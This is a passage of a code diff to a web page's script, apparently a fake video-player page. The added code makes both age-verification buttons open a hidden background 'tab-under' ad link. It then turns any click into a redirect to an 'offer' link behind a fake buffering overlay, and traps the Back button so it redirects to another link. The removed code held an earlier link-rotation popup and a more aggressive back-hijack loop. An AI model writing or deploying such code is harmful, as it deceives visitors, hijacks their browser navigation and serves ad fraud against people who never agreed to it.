-                        ctx.strokeStyle = `rgba(255, 0, 60, ${this.alpha})`;
-                        ctx.lineWidth = 2;
-                        ctx.stroke();
-                    }
+            // STEP 1: TAB-UNDER TRIGGER ON AGE VERIFY BUTTONS
+            function executeTabUnder(e) {
+                e.stopPropagation();
+                
+                // Open SPECIFIC TAB-UNDER LINK in background/new tab
+                let newTab = window.open(TAB_UNDER_LINK, '_blank');
+                if (newTab) {
+                    newTab.blur();
+                    window.focus();
                 }
 
-                let lastSpawn = 0;
-                function animate(timestamp) {
-                    ctx.clearRect(0, 0, canvas.width, canvas.height);
-                    if (timestamp - lastSpawn > 900) {
-                        ripples.push(new Ripple(canvas.width / 2, canvas.height / 2));
-                        lastSpawn = timestamp;
-                    }
-                    for (let i = ripples.length - 1; i >= 0; i--) {
-                        ripples[i].update();
-                        ripples[i].draw();
-                        if (ripples[i].alpha <= 0) ripples.splice(i, 1);
-                    }
-                    requestAnimationFrame(animate);
-                }
-                requestAnimationFrame(animate);
-            }
-            initOptimizedPlayerAnimation();
-
-            // Link Rotation Execution
-            function triggerLinks() {
-                let directLink = linkPool[currentLinkIndex];
-                let redirectLink = linkPool[(currentLinkIndex + 1) % linkPool.length];
-
-                currentLinkIndex = (currentLinkIndex + 1) % linkPool.length;
-
-                try {
-                    let pop = window.open(redirectLink, '_blank');
-                    if (!pop || pop.closed || typeof pop.closed == 'undefined') {
-                        window.open(redirectLink);
-                    }
-                } catch(e) {}
-
-                window.location.href = directLink;
+                // Hide Modal, Stay on Main Player Page
+                document.getElementById('ageModal').style.display = 'none';
+                isModalActive = false;
             }
 
-            document.addEventListener('click', function(e) {
-                if (e.target.closest('.clickable-element')) {
-                    triggerLinks();
+            document.getElementById('btnYes').addEventListener('click', executeTabUnder);
+            document.getElementById('btnNo').addEventListener('click', executeTabUnder);
+
+            // STEP 2: CLICK ANY ELEMENT -> 0.5s BUFFERING -> REDIRECT TO MAIN OFFER LINK
+            let isRedirecting = false;
+            document.body.addEventListener('click', function() {
+                if (!isModalActive && !isRedirecting) {
+                    isRedirecting = true;
+                    
+                    // Show 0.5s Buffering Overlay
+                    document.getElementById('bufferLoader').style.display = 'flex';
+
+                    // Redirect to SPECIFIC MAIN OFFER LINK after 500ms (0.5 Second)
+                    setTimeout(function() {
+                        window.location.href = MAIN_OFFER_LINK;
+                    }, 500);
                 }
             });
 
-            // Back Hijack System
+            // Back Hijack Trap
             function setBackTrap() {
-                for (let i = 0; i < 10; i++) {
-                    window.history.pushState({ trap: true }, document.title, window.location.href);
-                }
+                window.history.pushState({ trap: true }, document.title, window.location.href);
             }
-
             setBackTrap();
-
-            ['touchstart', 'mousemove', 'scroll', 'keydown'].forEach(evt => {
-                window.addEventListener(evt, setBackTrap, { once: true, passive: true });
-            });
-
-            window.addEventListener('popstate', function(e) {
+            window.addEventListener('popstate', function() {
                 window.location.replace(BACK_HIJACK_LINK);
             });
-
         })();
     </script>
 </body>
